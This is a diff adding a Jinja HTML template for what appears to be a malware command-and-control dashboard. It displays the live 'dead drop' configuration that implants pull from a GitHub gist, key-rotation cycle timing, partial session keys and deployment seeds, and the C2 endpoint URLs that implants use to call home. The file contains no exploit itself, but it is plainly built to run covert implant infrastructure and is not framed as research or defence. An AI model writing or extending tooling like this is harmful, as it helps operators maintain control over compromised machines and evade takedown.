@@ -1,0 +1,65 @@
+<!-- templates/config.html -->
+{% extends "base.html" %}
+{% block title %}Config{% endblock %}
+{% block nav_config %}active{% endblock %}
+
+{% block content %}
+<div class="page-header">
+    <h2>⚙️ Configuration</h2>
+    <div class="meta">Dead drop config · rotation settings · what implants see</div>
+</div>
+
+<!-- Dead drop config -->
+<div class="card">
+    <div class="card-header">
+        <div class="card-title">Dead Drop Config (Live)</div>
+        <div class="card-subtitle">This is what implants currently pull from the GitHub gist</div>
+    </div>
+    {% if dd_config and dd_config.error %}
+    <div style="color:var(--red);padding:20px;">Error reading dead drop: {{ dd_config.error }}</div>
+    {% elif dd_config %}
+    <pre id="dd-config">{{ dd_config | tojson(indent=2) }}</pre>
+    {% else %}
+    <div style="color:var(--text-dim);padding:20px;text-align:center;">Loading dead drop config...</div>
+    {% endif %}
+</div>
+
+<!-- Rotation settings -->
+<div class="card">
+    <div class="card-header">
+        <div class="card-title">Rotation Settings</div>
+        <div class="card-subtitle">Current cycle parameters</div>
+    </div>
+    <table>
+        <tr><td style="width:250px;color:var(--text-dim);">Cycle Interval</td><td class="mono">{{ cycle_minutes }} minutes</td></tr>
+        <tr><td style="color:var(--text-dim);">Current Cycle</td><td class="mono">{{ cycle.cycle_ts if cycle.status == "active" else "initializing" }}</td></tr>
+        <tr><td style="color:var(--text-dim);">Elapsed</td><td class="mono">{{ cycle.elapsed_seconds // 60 if cycle.status == "active" else 0 }}m</td></tr>
+        <tr><td style="color:var(--text-dim);">Remaining</td><td class="mono">{{ cycle.remaining_seconds // 60 if cycle.status == "active" else cycle_minutes }}m</td></tr>
+        <tr><td style="color:var(--text-dim);">Session Key</td><td class="mono">{{ dd_config.key[:16] if dd_config and dd_config.key else 'N/A' }}...</td></tr>
+        <tr><td style="color:var(--text-dim);">Deployment Seed</td><td class="mono">{{ dd_config.seed[:16] if dd_config and dd_config.seed else 'N/A' }}...</td></tr>
+    </table>
+</div>
+
+<!-- Endpoints in dead drop -->
+<div class="card">
+    <div class="card-header">
+        <div class="card-title">Endpoints (from Dead Drop)</div>
+        <div class="card-subtitle">URLs that implants use to reach C2</div>
+    </div>
+    {% if dd_config and dd_config.endpoints %}
+    <table>
+        <thead><tr><th>Name</th><th>URL</th></tr></thead>
+        <tbody>
+            {% for name, url in dd_config.endpoints.items() %}
+            <tr>
+                <td class="mono">{{ name }}</td>
+                <td><a href="{{ url }}" target="_blank" class="mono">{{ url }}</a></td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+    {% else %}
+    <div style="color:var(--text-dim);padding:20px;text-align:center;">No endpoints in dead drop yet.</div>
+    {% endif %}
+</div>
+{% endblock %}
